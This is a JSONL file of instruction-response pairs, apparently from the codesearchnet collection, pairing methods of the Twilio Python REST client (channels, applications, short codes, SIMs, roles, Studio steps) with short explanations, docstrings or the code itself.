{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create(self, friendly_name=values.unset, unique_name=values.unset,\n               attributes=values.unset, type=values.unset):\n        \"\"\"\n        Create a new ChannelInstance\n\n        :param unicode friendly_name: A human-readable name for the Channel.\n        :param unicode unique_name: A unique, addressable name for the Channel.\n        :param unicode attributes: An optional metadata field you can use to store any data you wish.\n        :param ChannelInstance.ChannelType type: The visibility of the channel - public or private.\n\n        :returns: Newly created ChannelInstance\n        :rtype: twilio.rest.chat.v1.service.channel.ChannelInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'UniqueName': unique_name,\n            'Attributes': attributes,\n            'Type': type,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ChannelInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Create a new ChannelInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nstream the ChannelInstance records from the API as a list.", "response": "def list(self, type=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists ChannelInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param ChannelInstance.ChannelType type: The type\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.chat.v1.service.channel.ChannelInstance]\n        \"\"\"\n        return list(self.stream(type=type, limit=limit, page_size=page_size, ))"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef page(self, type=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of ChannelInstance records from the API.\n        Request is executed immediately\n\n        :param ChannelInstance.ChannelType type: The type\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of ChannelInstance\n        :rtype: twilio.rest.chat.v1.service.channel.ChannelPage\n        \"\"\"\n        params = values.of({\n            'Type': serialize.map(type, lambda e: e),\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return ChannelPage(self._version, response, self._solution)", "response": "Retrieve a single page of ChannelInstance records from the API. Request is executed immediately"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get(self, sid):\n        return ChannelContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )", "response": "Constructs a ChannelContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.chat.v1.service.channel.ChannelContext\n        :rtype: twilio.rest.chat.v1.service.channel.ChannelContext"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nbuild an instance of ChannelInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of ChannelInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.chat.v1.service.channel.ChannelInstance\n        :rtype: twilio.rest.chat.v1.service.channel.ChannelInstance\n        \"\"\"\n        return ChannelInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update(self, friendly_name=values.unset, unique_name=values.unset,\n               attributes=values.unset):\n        \"\"\"\n        Update the ChannelInstance\n\n        :param unicode friendly_name: A human-readable name for the Channel.\n        :param unicode unique_name: A unique, addressable name for the Channel.\n        :param unicode attributes: An optional metadata field you can use to store any data you wish.\n\n        :returns: Updated ChannelInstance\n        :rtype: twilio.rest.chat.v1.service.channel.ChannelInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'UniqueName': unique_name,\n            'Attributes': attributes,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ChannelInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Update the ChannelInstance\n\n        :param unicode friendly_name: A human-readable name for the Channel.\n        :param unicode unique_name: A unique, addressable name for the Channel.\n        :param unicode attributes: An optional metadata field you can use to store any data you wish.\n\n        :returns: Updated ChannelInstance\n        :rtype: twilio.rest.chat.v1.service.channel.ChannelInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef members(self):\n        if self._members is None:\n            self._members = MemberList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                channel_sid=self._solution['sid'],\n            )\n        return self._members", "response": "Access the members\n\n        :returns: twilio.rest.chat.v1.service.channel.member.MemberList\n        :rtype: twilio.rest.chat.v1.service.channel.member.MemberList"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naccess the messages :returns: twilio.rest.chat.v1.service.channel.message.MessageList :rtype: twilio.rest.chat.v1.service.channel.message.MessageList", "response": "def messages(self):\n        \"\"\"\n        Access the messages\n\n        :returns: twilio.rest.chat.v1.service.channel.message.MessageList\n        :rtype: twilio.rest.chat.v1.service.channel.message.MessageList\n        \"\"\"\n        if self._messages is None:\n            self._messages = MessageList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                channel_sid=self._solution['sid'],\n            )\n        return self._messages"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef invites(self):\n        if self._invites is None:\n            self._invites = InviteList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                channel_sid=self._solution['sid'],\n            )\n        return self._invites", "response": "Access the invites\n\n        :returns: twilio.rest.chat.v1.service.channel.invite.InviteList\n        :rtype: twilio.rest.chat.v1.service.channel.invite.InviteList"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate an instance context for the resource we are interested in", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: ChannelContext for this ChannelInstance\n        :rtype: twilio.rest.chat.v1.service.channel.ChannelContext\n        \"\"\"\n        if self._context is None:\n            self._context = ChannelContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncreating a new ApplicationInstance with the specified friendly name.", "response": "def create(self, friendly_name, api_version=values.unset,\n               voice_url=values.unset, voice_method=values.unset,\n               voice_fallback_url=values.unset, voice_fallback_method=values.unset,\n               status_callback=values.unset, status_callback_method=values.unset,\n               voice_caller_id_lookup=values.unset, sms_url=values.unset,\n               sms_method=values.unset, sms_fallback_url=values.unset,\n               sms_fallback_method=values.unset, sms_status_callback=values.unset,\n               message_status_callback=values.unset):\n        \"\"\"\n        Create a new ApplicationInstance\n\n        :param unicode friendly_name: A string to describe the new resource\n        :param unicode api_version: The API version to use to start a new TwiML session\n        :param unicode voice_url: The URL to call when the phone number receives a call\n        :param unicode voice_method: The HTTP method to use with the voice_url\n        :param unicode voice_fallback_url: The URL to call when a TwiML error occurs\n        :param unicode voice_fallback_method: The HTTP method to use with voice_fallback_url\n        :param unicode status_callback: The URL to send status information to your application\n        :param unicode status_callback_method: The HTTP method to use to call status_callback\n        :param bool voice_caller_id_lookup: Whether to lookup the caller's name\n        :param unicode sms_url: The URL to call when the phone number receives an incoming SMS message\n        :param unicode sms_method: The HTTP method to use with sms_url\n        :param unicode sms_fallback_url: The URL to call when an error occurs while retrieving or executing the TwiML\n        :param unicode sms_fallback_method: The HTTP method to use with sms_fallback_url\n        :param unicode sms_status_callback: The URL to send status information to your application\n        :param unicode message_status_callback: The URL to send message status information to your application\n\n        :returns: Newly created ApplicationInstance\n        :rtype: twilio.rest.api.v2010.account.application.ApplicationInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'ApiVersion': api_version,\n            'VoiceUrl': voice_url,\n            'VoiceMethod': voice_method,\n            'VoiceFallbackUrl': voice_fallback_url,\n            'VoiceFallbackMethod': voice_fallback_method,\n            'StatusCallback': status_callback,\n            'StatusCallbackMethod': status_callback_method,\n            'VoiceCallerIdLookup': voice_caller_id_lookup,\n            'SmsUrl': sms_url,\n            'SmsMethod': sms_method,\n            'SmsFallbackUrl': sms_fallback_url,\n            'SmsFallbackMethod': sms_fallback_method,\n            'SmsStatusCallback': sms_status_callback,\n            'MessageStatusCallback': message_status_callback,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ApplicationInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconstruct a ApplicationContext :param sid: The unique string that identifies the resource :returns: twilio.rest.api.v2010.account.application.ApplicationContext :rtype: twilio.rest.api.v2010.account.application.ApplicationContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a ApplicationContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.application.ApplicationContext\n        :rtype: twilio.rest.api.v2010.account.application.ApplicationContext\n        \"\"\"\n        return ApplicationContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nbuild an instance of ApplicationInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of ApplicationInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.application.ApplicationInstance\n        :rtype: twilio.rest.api.v2010.account.application.ApplicationInstance\n        \"\"\"\n        return ApplicationInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngenerates an instance context for the application instance", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: ApplicationContext for this ApplicationInstance\n        :rtype: twilio.rest.api.v2010.account.application.ApplicationContext\n        \"\"\"\n        if self._context is None:\n            self._context = ApplicationContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nupdate the ApplicationInstance s properties", "response": "def update(self, friendly_name=values.unset, api_version=values.unset,\n               voice_url=values.unset, voice_method=values.unset,\n               voice_fallback_url=values.unset, voice_fallback_method=values.unset,\n               status_callback=values.unset, status_callback_method=values.unset,\n               voice_caller_id_lookup=values.unset, sms_url=values.unset,\n               sms_method=values.unset, sms_fallback_url=values.unset,\n               sms_fallback_method=values.unset, sms_status_callback=values.unset,\n               message_status_callback=values.unset):\n        \"\"\"\n        Update the ApplicationInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode api_version: The API version to use to start a new TwiML session\n        :param unicode voice_url: The URL to call when the phone number receives a call\n        :param unicode voice_method: The HTTP method to use with the voice_url\n        :param unicode voice_fallback_url: The URL to call when a TwiML error occurs\n        :param unicode voice_fallback_method: The HTTP method to use with voice_fallback_url\n        :param unicode status_callback: The URL to send status information to your application\n        :param unicode status_callback_method: The HTTP method to use to call status_callback\n        :param bool voice_caller_id_lookup: Whether to lookup the caller's name\n        :param unicode sms_url: The URL to call when the phone number receives an incoming SMS message\n        :param unicode sms_method: The HTTP method to use with sms_url\n        :param unicode sms_fallback_url: The URL to call when an error occurs while retrieving or executing the TwiML\n        :param unicode sms_fallback_method: The HTTP method to use with sms_fallback_url\n        :param unicode sms_status_callback: The URL to send status information to your application\n        :param unicode message_status_callback: The URL to send message status information to your application\n\n        :returns: Updated ApplicationInstance\n        :rtype: twilio.rest.api.v2010.account.application.ApplicationInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            api_version=api_version,\n            voice_url=voice_url,\n            voice_method=voice_method,\n            voice_fallback_url=voice_fallback_url,\n            voice_fallback_method=voice_fallback_method,\n            status_callback=status_callback,\n            status_callback_method=status_callback_method,\n            voice_caller_id_lookup=voice_caller_id_lookup,\n            sms_url=sms_url,\n            sms_method=sms_method,\n            sms_fallback_url=sms_fallback_url,\n            sms_fallback_method=sms_fallback_method,\n            sms_status_callback=sms_status_callback,\n            message_status_callback=message_status_callback,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naccesses the numbers :returns: twilio.rest.pricing.v1.voice.number.NumberList :rtype: twilio.rest.pricing.v1.voice.number.NumberList", "response": "def numbers(self):\n        \"\"\"\n        Access the numbers\n\n        :returns: twilio.rest.pricing.v1.voice.number.NumberList\n        :rtype: twilio.rest.pricing.v1.voice.number.NumberList\n        \"\"\"\n        if self._numbers is None:\n            self._numbers = NumberList(self._version, )\n        return self._numbers"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncreate a new ShortCodeInstance", "response": "def create(self, sid):\n        \"\"\"\n        Create a new ShortCodeInstance\n\n        :param unicode sid: The SID of a Twilio ShortCode resource\n\n        :returns: Newly created ShortCodeInstance\n        :rtype: twilio.rest.proxy.v1.service.short_code.ShortCodeInstance\n        \"\"\"\n        data = values.of({'Sid': sid, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ShortCodeInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get(self, sid):\n        return ShortCodeContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )", "response": "Constructs a ShortCodeContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.proxy.v1.service.short_code.ShortCodeContext\n        :rtype: twilio.rest.proxy.v1.service.short_code.ShortCodeContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_instance(self, payload):\n        return ShortCodeInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Build an instance of ShortCodeInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef update(self, is_reserved=values.unset):\n        data = values.of({'IsReserved': is_reserved, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ShortCodeInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Update the ShortCodeInstance\n\n        :param bool is_reserved: Whether the short code should be reserved for manual assignment to participants only\n\n        :returns: Updated ShortCodeInstance\n        :rtype: twilio.rest.proxy.v1.service.short_code.ShortCodeInstance"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _proxy(self):\n        if self._context is None:\n            self._context = ShortCodeContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, is_reserved=values.unset):\n        return self._proxy.update(is_reserved=is_reserved, )", "response": "Update the ShortCodeInstance s metadata"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return ExportInstance(self._version, payload, resource_type=self._solution['resource_type'], )", "response": "Fetch a ExportInstance\n\n        :returns: Fetched ExportInstance\n        :rtype: twilio.rest.preview.bulk_exports.export.ExportInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\naccessing the days :returns: twilio.rest.preview.bulk_exports.export.day.DayList :rtype: twilio.rest.preview.bulk_exports.export.day.DayList", "response": "def days(self):\n        \"\"\"\n        Access the days\n\n        :returns: twilio.rest.preview.bulk_exports.export.day.DayList\n        :rtype: twilio.rest.preview.bulk_exports.export.day.DayList\n        \"\"\"\n        if self._days is None:\n            self._days = DayList(self._version, resource_type=self._solution['resource_type'], )\n        return self._days"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = ExportContext(self._version, resource_type=self._solution['resource_type'], )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef create(self, body=values.unset, media_url=values.unset):\n        data = values.of({'Body': body, 'MediaUrl': serialize.map(media_url, lambda e: e), })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return MessageInteractionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            session_sid=self._solution['session_sid'],\n            participant_sid=self._solution['participant_sid'],\n        )", "response": "Create a new MessageInteractionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_instance(self, payload):\n        return MessageInteractionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            session_sid=self._solution['session_sid'],\n            participant_sid=self._solution['participant_sid'],\n        )", "response": "Build an instance of MessageInteractionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: MessageInteractionContext for this MessageInteractionInstance\n        :rtype: twilio.rest.proxy.v1.service.session.participant.message_interaction.MessageInteractionContext\n        \"\"\"\n        if self._context is None:\n            self._context = MessageInteractionContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                session_sid=self._solution['session_sid'],\n                participant_sid=self._solution['participant_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef stream(self, status=values.unset, iccid=values.unset,\n               rate_plan=values.unset, e_id=values.unset,\n               sim_registration_code=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Streams SimInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param unicode status: The status\n        :param unicode iccid: The iccid\n        :param unicode rate_plan: The rate_plan\n        :param unicode e_id: The e_id\n        :param unicode sim_registration_code: The sim_registration_code\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.preview.wireless.sim.SimInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            status=status,\n            iccid=iccid,\n            rate_plan=rate_plan,\n            e_id=e_id,\n            sim_registration_code=sim_registration_code,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])", "response": "Streams SimInstance records from the API as a generator."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef list(self, status=values.unset, iccid=values.unset, rate_plan=values.unset,\n             e_id=values.unset, sim_registration_code=values.unset, limit=None,\n             page_size=None):\n        \"\"\"\n        Lists SimInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode status: The status\n        :param unicode iccid: The iccid\n        :param unicode rate_plan: The rate_plan\n        :param unicode e_id: The e_id\n        :param unicode sim_registration_code: The sim_registration_code\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.preview.wireless.sim.SimInstance]\n        \"\"\"\n        return list(self.stream(\n            status=status,\n            iccid=iccid,\n            rate_plan=rate_plan,\n            e_id=e_id,\n            sim_registration_code=sim_registration_code,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Streams SimInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nretrieve a single page of SimInstance records from the API. Request is executed immediately", "response": "def page(self, status=values.unset, iccid=values.unset, rate_plan=values.unset,\n             e_id=values.unset, sim_registration_code=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of SimInstance records from the API.\n        Request is executed immediately\n\n        :param unicode status: The status\n        :param unicode iccid: The iccid\n        :param unicode rate_plan: The rate_plan\n        :param unicode e_id: The e_id\n        :param unicode sim_registration_code: The sim_registration_code\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of SimInstance\n        :rtype: twilio.rest.preview.wireless.sim.SimPage\n        \"\"\"\n        params = values.of({\n            'Status': status,\n            'Iccid': iccid,\n            'RatePlan': rate_plan,\n            'EId': e_id,\n            'SimRegistrationCode': sim_registration_code,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return SimPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef usage(self):\n        if self._usage is None:\n            self._usage = UsageList(self._version, sim_sid=self._solution['sid'], )\n        return self._usage", "response": "Access the usage\n\n        :returns: twilio.rest.preview.wireless.sim.usage.UsageList\n        :rtype: twilio.rest.preview.wireless.sim.usage.UsageList"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _proxy(self):\n        if self._context is None:\n            self._context = SimContext(self._version, sid=self._solution['sid'], )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nupdate the SimInstance s unique_name", "response": "def update(self, unique_name=values.unset, callback_method=values.unset,\n               callback_url=values.unset, friendly_name=values.unset,\n               rate_plan=values.unset, status=values.unset,\n               commands_callback_method=values.unset,\n               commands_callback_url=values.unset, sms_fallback_method=values.unset,\n               sms_fallback_url=values.unset, sms_method=values.unset,\n               sms_url=values.unset, voice_fallback_method=values.unset,\n               voice_fallback_url=values.unset, voice_method=values.unset,\n               voice_url=values.unset):\n        \"\"\"\n        Update the SimInstance\n\n        :param unicode unique_name: The unique_name\n        :param unicode callback_method: The callback_method\n        :param unicode callback_url: The callback_url\n        :param unicode friendly_name: The friendly_name\n        :param unicode rate_plan: The rate_plan\n        :param unicode status: The status\n        :param unicode commands_callback_method: The commands_callback_method\n        :param unicode commands_callback_url: The commands_callback_url\n        :param unicode sms_fallback_method: The sms_fallback_method\n        :param unicode sms_fallback_url: The sms_fallback_url\n        :param unicode sms_method: The sms_method\n        :param unicode sms_url: The sms_url\n        :param unicode voice_fallback_method: The voice_fallback_method\n        :param unicode voice_fallback_url: The voice_fallback_url\n        :param unicode voice_method: The voice_method\n        :param unicode voice_url: The voice_url\n\n        :returns: Updated SimInstance\n        :rtype: twilio.rest.preview.wireless.sim.SimInstance\n        \"\"\"\n        return self._proxy.update(\n            unique_name=unique_name,\n            callback_method=callback_method,\n            callback_url=callback_url,\n            friendly_name=friendly_name,\n            rate_plan=rate_plan,\n            status=status,\n            commands_callback_method=commands_callback_method,\n            commands_callback_url=commands_callback_url,\n            sms_fallback_method=sms_fallback_method,\n            sms_fallback_url=sms_fallback_url,\n            sms_method=sms_method,\n            sms_url=sms_url,\n            voice_fallback_method=voice_fallback_method,\n            voice_fallback_url=voice_fallback_url,\n            voice_method=voice_method,\n            voice_url=voice_url,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef create(self, friendly_name, type, permission):\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'Type': type,\n            'Permission': serialize.map(permission, lambda e: e),\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return RoleInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Create a new RoleInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nconstructing a RoleContext :param sid: The unique string that identifies the resource :returns: twilio.rest.chat.v2.service.role.RoleContext :rtype: twilio.rest.chat.v2.service.role.RoleContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a RoleContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.chat.v2.service.role.RoleContext\n        :rtype: twilio.rest.chat.v2.service.role.RoleContext\n        \"\"\"\n        return RoleContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nbuilding an instance of RoleInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of RoleInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.chat.v2.service.role.RoleInstance\n        :rtype: twilio.rest.chat.v2.service.role.RoleInstance\n        \"\"\"\n        return RoleInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating the RoleInstance :param unicode permission: A permission the role should have :returns: Updated RoleInstance :rtype: twilio.rest.chat.v2.service.role.RoleInstance", "response": "def update(self, permission):\n        \"\"\"\n        Update the RoleInstance\n\n        :param unicode permission: A permission the role should have\n\n        :returns: Updated RoleInstance\n        :rtype: twilio.rest.chat.v2.service.role.RoleInstance\n        \"\"\"\n        data = values.of({'Permission': serialize.map(permission, lambda e: e), })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return RoleInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = RoleContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the resource"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nconstruct a StepContext :param sid: Step Sid. :returns: twilio.rest.studio.v1.flow.engagement.step.StepContext :rtype: twilio.rest.studio.v1.flow.engagement.step.StepContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a StepContext\n\n        :param sid: Step Sid.\n\n        :returns: twilio.rest.studio.v1.flow.engagement.step.StepContext\n        :rtype: twilio.rest.studio.v1.flow.engagement.step.StepContext\n        \"\"\"\n        return StepContext(\n            self._version,\n            flow_sid=self._solution['flow_sid'],\n            engagement_sid=self._solution['engagement_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nbuilds an instance of StepInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of StepInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.studio.v1.flow.engagement.step.StepInstance\n        :rtype: twilio.rest.studio.v1.flow.engagement.step.StepInstance\n        \"\"\"\n        return StepInstance(\n            self._version,\n            payload,\n            flow_sid=self._solution['flow_sid'],\n            engagement_sid=self._solution['engagement_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return StepInstance(\n            self._version,\n            payload,\n            flow_sid=self._solution['flow_sid'],\n            engagement_sid=self._solution['engagement_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Fetch a StepInstance\n\n        :returns: Fetched StepInstance\n        :rtype: twilio.rest.studio.v1.flow.engagement.step.StepInstance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naccess the step_context :returns: twilio.rest.studio.v1.flow.engagement.step.step_context.StepContextList :rtype: twilio.rest.studio.v1.flow.engagement.step.step_context.StepContextList", "response": "def step_context(self):\n        \"\"\"\n        Access the step_context\n\n        :returns: twilio.rest.studio.v1.flow.engagement.step.step_context.StepContextList\n        :rtype: twilio.rest.studio.v1.flow.engagement.step.step_context.StepContextList\n        \"\"\"\n        if self._step_context is None:\n            self._step_context = StepContextList(\n                self._version,\n                flow_sid=self._solution['flow_sid'],\n                engagement_sid=self._solution['engagement_sid'],\n                step_sid=self._solution['sid'],\n            )\n        return self._step_context"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngenerates an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: StepContext for this StepInstance\n        :rtype: twilio.rest.studio.v1.flow.engagement.step.StepContext\n        \"\"\"\n        if self._context is None:\n            self._context = StepContext(\n                self._version,\n                flow_sid=self._solution['flow_sid'],\n                engagement_sid=self._solution['engagement_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
